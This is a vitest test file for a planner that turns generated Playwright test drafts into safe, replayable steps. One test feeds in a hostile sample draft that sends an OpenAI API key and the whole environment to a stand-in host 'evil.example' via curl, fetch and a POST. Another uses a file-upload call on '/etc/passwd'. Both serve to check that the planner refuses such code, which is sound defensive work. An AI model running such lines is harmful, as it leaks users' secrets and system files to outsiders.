import { describe, expect, it } from "vitest";

import { planPreviewRun } from "@/lib/free-tools/preview-run/plan";

const todoTest = `import { test, expect } from '@playwright/test';

const firstText = 'Buy milk';

test.describe('TodoMVC', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/todomvc/');
    await expect(page.getByRole('heading', { name: 'todos' })).toBeVisible();
  });

  test('adds and completes a todo', async ({ page }) => {
    const newTodo = page.getByRole('textbox', { name: 'What needs to be done?' });
    await test.step('add first todo', async () => {
      await newTodo.fill(firstText);
      await newTodo.press('Enter');
      await expect(page.getByTestId('todo-title')).toHaveText(firstText);
    });
    await test.step('complete it', async () => {
      await page.getByRole('checkbox', { name: 'Toggle Todo' }).check();
      await expect(page.getByTestId('todo-item').first()).toHaveClass(/completed/);
      await expect(page).toHaveURL(/todomvc/);
    });
  });
});`;

describe("reading a draft into replayable steps", () => {
  it("turns a typical generated test into steps without running anything", () => {
    const plan = planPreviewRun(todoTest);
    expect(plan.beforeEach.map((operation) => operation.op)).toEqual(["goto", "expect"]);
    expect(plan.tests).toHaveLength(1);
    const [test] = plan.tests;
    expect(test.name).toBe("adds and completes a todo");
    expect(test.steps.map((step) => step.name)).toEqual(["add first todo", "complete it"]);
    expect(test.steps[0].operations).toEqual([
      expect.objectContaining({ op: "action", action: "fill", value: "Buy milk", locator: [{ by: "role", role: "textbox", name: { kind: "string", value: "What needs to be done?" } }] }),
      expect.objectContaining({ op: "action", action: "press", value: "Enter" }),
      expect.objectContaining({ op: "expect", matcher: "toHaveText", expected: { kind: "string", value: "Buy milk" } }),
    ]);
    expect(test.steps[1].operations.map((operation) => operation.op)).toEqual(["action", "expect", "expect"]);
    expect(test.steps[1].operations[1]).toMatchObject({ locator: [{ by: "testId", id: "todo-item" }, { by: "first" }], expected: { kind: "regex", source: "completed" } });
  });

  it("lists anything outside the safe set instead of evaluating it", () => {
    const hostile = `import { test, expect } from '@playwright/test';
import { execSync } from 'child_process';
test('x', async ({ page, request }) => {
  execSync('curl https://evil.example/?k=' + process.env.OPENAI_API_KEY);
  await page.evaluate(() => fetch('https://evil.example'));
  await request.post('https://evil.example', { data: process.env });
  await page.getByRole('button', { name: process.env.SECRET }).click();
  await page.locator('xpath=//button').click();
  for (const x of [1, 2]) { await page.goto('https://evil.example'); }
  await page.getByRole('button', { name: 'Save' }).click();
});`;
    const plan = planPreviewRun(hostile);
    const operations = plan.tests[0].steps.flatMap((step) => step.operations);
    // The loop over literal data is replayed; its goto to another site is
    // refused by the runner, which opens only the draft's own origin.
    expect(operations.map((operation) => operation.op)).toEqual([
      "unsupported", "unsupported", "unsupported", "unsupported", "unsupported", "goto", "goto", "action",
    ]);
    expect(operations[3]).toMatchObject({ op: "unsupported", reason: "needs SECRET from your environment" });
    expect(operations[5]).toMatchObject({ op: "goto", url: "https://evil.example" });
    expect(operations[7]).toMatchObject({ action: "click", locator: [{ by: "role", role: "button", name: { kind: "string", value: "Save" } }] });
  });

  it("uses a literal fallback for an environment value", () => {
    const plan = planPreviewRun(`test('x', async ({ page }) => {
  const user = process.env.E2E_USER ?? 'standard_user';
  await page.getByLabel('Username').fill(user);
});`);
    expect(plan.tests[0].steps[0].operations[0]).toMatchObject({ action: "fill", value: "standard_user" });
  });

  it("marks negated assertions", () => {
    const plan = planPreviewRun(`test('x', async ({ page }) => {
  await expect(page.getByText('Error')).not.toBeVisible();
});`);
    expect(plan.tests[0].steps[0].operations[0]).toMatchObject({ op: "expect", matcher: "toBeVisible", negated: true });
  });

  it("reads filter({ hasText }) with a variable and locators chained from it", () => {
    const plan = planPreviewRun(`test('x', async ({ page }) => {
  const TODO1 = 'Buy milk';
  await test.step('complete', async () => {
    const item = page.getByRole('listitem').filter({ hasText: TODO1 });
    const toggle = item.getByRole('checkbox');
    await toggle.check();
    await expect(item).not.toBeVisible();
  });
});`);
    const operations = plan.tests[0].steps[0].operations;
    expect(operations[0]).toMatchObject({
      op: "action",
      action: "check",
      locator: [
        { by: "role", role: "listitem" },
        { by: "filter", hasText: { kind: "string", value: "Buy milk" } },
        { by: "role", role: "checkbox" },
      ],
    });
    expect(operations[1]).toMatchObject({ op: "expect", matcher: "toBeVisible", negated: true });
  });

  it("replays a for...of over inline test data once per item", () => {
    const plan = planPreviewRun(`const TODO_ITEMS = ['Buy milk', 'Walk dog'];
const user = { name: 'standard_user' };
test('x', async ({ page }) => {
  const input = page.getByRole('textbox', { name: 'What needs to be done?' });
  for (const item of TODO_ITEMS) {
    await input.fill(item);
    await input.press('Enter');
  }
  await expect(page.getByTestId('todo-title').first()).toHaveText(TODO_ITEMS[0]);
  await page.getByLabel('Username').fill(user.name);
  for (let i = 0; i < 3; i++) { await input.press('Tab'); }
});`);
    const operations = plan.tests[0].steps.flatMap((step) => step.operations);
    expect(operations.map((operation) => (operation.op === "action" ? `${operation.action}:${operation.value ?? ""}` : operation.op))).toEqual([
      "fill:Buy milk", "press:Enter", "fill:Walk dog", "press:Enter", "expect", "fill:standard_user", "unsupported",
    ]);
    expect(operations[4]).toMatchObject({ matcher: "toHaveText", expected: { kind: "string", value: "Buy milk" } });
  });

  it("signs in with supplied values past a guard check, keeping lines in order", () => {
    const plan = planPreviewRun(`test.beforeEach(async ({ page }) => {
  const username = process.env.E2E_USERNAME;
  const password = process.env.E2E_PASSWORD ?? 'fallback';
  if (!username) throw new Error('E2E_USERNAME must be set');
  await page.goto('/');
  await test.step('Sign in', async () => {
    await page.getByRole('textbox', { name: 'Username' }).fill(username);
    await page.getByRole('textbox', { name: 'Password' }).fill(password);
  });
  // Written after the step, so it must run after it.
  await expect(page).toHaveURL(/inventory/);
});
test('x', async ({ page }) => {
  await expect(page).toHaveURL(/inventory/);
});`, { env: { E2E_USERNAME: "standard_user", E2E_PASSWORD: "secret_sauce" } });
    expect(plan.beforeEach.map((operation) => (operation.op === "action" ? `${operation.action}:${operation.value}` : operation.op))).toEqual([
      "goto", "fill:standard_user", "fill:secret_sauce", "expect",
    ]);
    const unsupplied = planPreviewRun(`test('x', async ({ page }) => {
  await page.getByRole('textbox', { name: 'Username' }).fill(process.env.E2E_USERNAME);
});`);
    expect(unsupplied.tests[0].steps[0].operations[0]).toMatchObject({ op: "unsupported", reason: "needs E2E_USERNAME from your environment" });
    const guarded = planPreviewRun(`test('x', async ({ page }) => {
  const username = process.env.E2E_USERNAME;
  if (!username) { throw new Error('missing'); }
  if (username.length > 3) throw new Error('odd');
});`, { env: { E2E_USERNAME: "" } });
    expect(guarded.tests[0].steps[0].operations.map((operation) => operation.op === "unsupported" && operation.reason)).toEqual([
      "this check stops the test: a value it needs is empty",
      "control flow is not run in the preview",
    ]);
  });

  it("reads constants declared inside a describe block", () => {
    const plan = planPreviewRun(`test.describe('cart', () => {
  const USERNAME = process.env.E2E_USERNAME!;
  test.beforeEach(async ({ page }) => {
    await page.getByRole('textbox', { name: 'Username' }).fill(USERNAME);
  });
  test('x', async ({ page }) => {
    await page.getByRole('button', { name: ITEM }).click();
  });
  const ITEM = 'Add to cart';
});`, { env: { E2E_USERNAME: "standard_user" } });
    expect(plan.beforeEach[0]).toMatchObject({ op: "action", action: "fill", value: "standard_user" });
    expect(plan.tests[0].steps[0].operations[0]).toMatchObject({ op: "action", locator: [{ by: "role", role: "button", name: { kind: "string", value: "Add to cart" } }] });
  });

  it("reads the hand-written expect(page.url()) checks", () => {
    const plan = planPreviewRun(`test('x', async ({ page }) => {
  expect(page.url()).toContain("inventory.html");
  expect(page.url()).toBe("https://www.saucedemo.com/");
  expect(page.url()).toMatch(/inventory/);
});`);
    const operations = plan.tests[0].steps[0].operations;
    expect(operations).toEqual([
      expect.objectContaining({ op: "expect", subject: "page", matcher: "toHaveURL", expected: { kind: "regex", source: String.raw`inventory\.html`, flags: "" } }),
      expect.objectContaining({ op: "expect", subject: "page", matcher: "toHaveURL", expected: { kind: "string", value: "https://www.saucedemo.com/" } }),
      expect.objectContaining({ op: "expect", subject: "page", matcher: "toHaveURL", expected: { kind: "regex", source: "inventory", flags: "" } }),
    ]);
  });
});

describe("steps that are safe to run but used to be refused", () => {
  const draft = (body: string) => `import { test, expect } from '@playwright/test';
test('x', async ({ page }) => {
  const field = page.getByRole('textbox', { name: 'Search' });
${body}
});`;

  it("runs the ordinary actions a generated test writes around typing", () => {
    // Every one of these changes nothing a person could not do, and leaving
    // them out turned a test that passed into "partly run".
    const plan = planPreviewRun(
      draft(`  await field.focus();
  await field.pressSequentially('abc');
  await field.type('abc');
  await field.selectText();
  await field.scrollIntoViewIfNeeded();
  await field.blur();`),
    );
    const operations = plan.tests[0].steps.flatMap((step) => step.operations);
    expect(operations.map((operation) => operation.op)).toEqual(Array(6).fill("action"));
    expect(operations.map((operation) => (operation as { action: string }).action)).toEqual([
      "focus",
      "pressSequentially",
      "type",
      "selectText",
      "scrollIntoViewIfNeeded",
      "blur",
    ]);
    expect(operations[1]).toMatchObject({ value: "abc" });
    expect(operations[2]).toMatchObject({ value: "abc" });
  });

  it("reads the checks that go with them", () => {
    const plan = planPreviewRun(
      draft(`  await expect(field).toBeFocused();
  await expect(field).toBeEditable();
  await expect(field).toBeAttached();
  await expect(field).toBeEmpty();
  await expect(field).not.toBeFocused();`),
    );
    const operations = plan.tests[0].steps.flatMap((step) => step.operations);
    expect(operations.map((operation) => (operation as { matcher: string }).matcher)).toEqual([
      "toBeFocused",
      "toBeEditable",
      "toBeAttached",
      "toBeEmpty",
      "toBeFocused",
    ]);
    expect(operations[4]).toMatchObject({ negated: true });
  });

  it("still refuses what it cannot run unattended", () => {
    const plan = planPreviewRun(
      draft(`  await field.setInputFiles('/etc/passwd');
  await page.evaluate(() => document.title);`),
    );
    const operations = plan.tests[0].steps.flatMap((step) => step.operations);
    expect(operations.every((operation) => operation.op === "unsupported")).toBe(true);
  });
});

describe("asserting a whole list in one line", () => {
  const draft = (body: string) => `import { test, expect } from '@playwright/test';
test('x', async ({ page }) => {
  const items = page.getByRole('listitem');
${body}
});`;

  it("reads toHaveText with a list, which is how a generated test checks order", () => {
    const plan = planPreviewRun(draft(`  await expect(items).toHaveText(['Task A', 'Task B', 'Task C']);`));
    expect(plan.tests[0].steps.flatMap((step) => step.operations)[0]).toMatchObject({
      op: "expect",
      matcher: "toHaveText",
      expected: {
        kind: "list",
        items: [
          { kind: "string", value: "Task A" },
          { kind: "string", value: "Task B" },
          { kind: "string", value: "Task C" },
        ],
      },
    });
  });

  it("takes a list of patterns too, and keeps toContainText working the same way", () => {
    const plan = planPreviewRun(draft(`  await expect(items).toContainText([/^Task/, 'Task B']);`));
    expect(plan.tests[0].steps.flatMap((step) => step.operations)[0]).toMatchObject({
      matcher: "toContainText",
      expected: { kind: "list", items: [{ kind: "regex", source: "^Task" }, { kind: "string", value: "Task B" }] },
    });
  });

  it("refuses a list it cannot read, rather than guessing at it", () => {
    const operations = planPreviewRun(
      draft(`  await expect(items).toHaveText([process.env.FIRST, 'Task B']);
  await expect(items).toHaveText([]);`),
    ).tests[0].steps.flatMap((step) => step.operations);
    expect(operations.every((operation) => operation.op === "unsupported")).toBe(true);
  });

  it("does not accept a list where only one value makes sense", () => {
    const operations = planPreviewRun(draft(`  await expect(items).toHaveValue(['a', 'b']);`))
      .tests[0].steps.flatMap((step) => step.operations);
    expect(operations[0]).toMatchObject({ op: "unsupported" });
  });
});

describe("counting before and after", () => {
  it("remembers a count read during the run and checks against it later", () => {
    const plan = planPreviewRun(`import { test, expect } from '@playwright/test';
test('x', async ({ page }) => {
  const items = page.getByRole('listitem');
  const before = await items.count();
  await page.getByRole('button', { name: 'Add' }).click();
  await expect(items).toHaveCount(before);
});`);
    const operations = plan.tests[0].steps.flatMap((step) => step.operations);
    expect(operations.map((operation) => operation.op)).toEqual(["capture", "action", "expect"]);
    expect(operations[0]).toMatchObject({ name: "before", locator: [{ by: "role", role: "listitem" }] });
    expect(operations[2]).toMatchObject({ matcher: "toHaveCount", expected: { kind: "ref", name: "before" } });
  });

  it("still takes a plain number, and still refuses a count it cannot get", () => {
    const plan = planPreviewRun(`import { test, expect } from '@playwright/test';
test('x', async ({ page }) => {
  const items = page.getByRole('listitem');
  await expect(items).toHaveCount(3);
  await expect(items).toHaveCount(Number(process.env.EXPECTED));
});`);
    const operations = plan.tests[0].steps.flatMap((step) => step.operations);
    expect(operations[0]).toMatchObject({ matcher: "toHaveCount", expected: 3 });
    expect(operations[1]).toMatchObject({ op: "unsupported" });
  });
});
